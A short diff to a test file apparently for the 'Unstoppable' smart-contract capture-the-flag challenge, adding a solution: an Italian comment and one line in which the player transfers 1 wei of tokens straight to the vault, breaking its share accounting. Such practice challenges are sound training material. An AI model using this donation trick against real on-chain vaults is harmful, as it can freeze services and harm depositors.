@@ -45,6 +45,8 @@ describe('[Challenge] Unstoppable', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        // @note inviando 1 wei al vault direttamente, senza mintare alcuna share, riusciamo a farle valere di meno
+        await token.connect(player).transfer(vault.address, 1);
     });
 
     after(async function () {
